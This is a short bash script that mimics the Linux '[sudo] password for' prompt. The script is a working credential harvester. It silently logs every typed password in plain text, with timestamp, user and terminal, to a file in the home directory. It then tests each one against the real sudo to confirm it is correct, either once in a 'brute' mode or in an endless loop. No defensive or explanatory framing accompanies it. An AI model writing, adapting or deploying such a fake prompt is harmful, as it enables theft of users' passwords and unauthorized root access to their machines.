#!/bin/bash

LOGFILE="$HOME/sudo_pass_log.txt"

if [[ "$FAKE_SUDO_MODE" == "brute" ]]; then
    echo -n "[sudo] password for $USER: "
    IFS= read -rs pass
    echo

    clean_pass=$(echo -n "$pass" | tr -d '\r\n')
    echo "$(date '+%F %T') [$USER@$(tty)] $clean_pass" >> "$LOGFILE"

    echo "$clean_pass" | /usr/bin/sudo -S -k -l >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "✅ Password correct."
	exit
    else
        sleep 1
        echo "Sorry, try again."
    fi
    exit
fi

# Normal loop mode
while true; do
    echo -n "[sudo] password for $USER: "
    IFS= read -rs pass
    echo

    clean_pass=$(echo -n "$pass" | tr -d '\r\n')
    echo "$(date '+%F %T') [$USER@$(tty)] $clean_pass" >> "$LOGFILE"

    echo "$clean_pass" | /usr/bin/sudo -S -k -l >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "✅ Password correct."
    else
        sleep 1
        echo "Sorry, try again."
    fi
done

